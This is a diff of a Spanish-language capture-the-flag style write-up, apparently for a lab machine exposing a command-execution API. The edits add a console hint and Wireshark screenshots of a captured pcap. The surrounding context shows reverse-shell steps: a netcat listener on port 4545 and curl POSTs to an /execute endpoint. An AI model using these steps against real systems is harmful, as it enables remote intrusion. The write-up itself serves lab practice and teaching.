@@ -311,7 +311,7 @@ curl -X POST http://secure-api-register.dl/execute \
 
 Al observar que esta ejecutando comandos correctamente vamos a intentar lograr una shell reversa
 
-Nos ponemos en escucha de la shell
+Nos ponemos en escucha de la shell (Ejecutamos en una nueva consola)
 
 ```bash
 nc -lvnp 4545
@@ -320,7 +320,7 @@ Despues de ejecutar el comando deberias ver algo asi
 
 ![image](https://github.com/user-attachments/assets/89a46e7d-a1ab-4602-bb16-677c62826425)
 
-Ahora ejecutamos la conexion
+Ahora ejecutamos la conexion 
 
 ```bash
 curl -X POST http://secure-api-register.dl/execute \
@@ -415,6 +415,9 @@ curl -O http://172.17.0.2:8080/traficDetect.pcap
 Así te lo descargas fácilmente.
 ![image](https://github.com/user-attachments/assets/bd80b093-4093-449b-9a3f-4ed6f5489f54)
 
+Abrimos el archivo traficDetect.pcap con wireshark
+![image](https://github.com/user-attachments/assets/5c1c2196-8d02-4180-b3fa-c86b0ace9aab)
+![image](https://github.com/user-attachments/assets/086d7d1e-f539-491f-a9ae-81976aefc6e1)
 
 
 
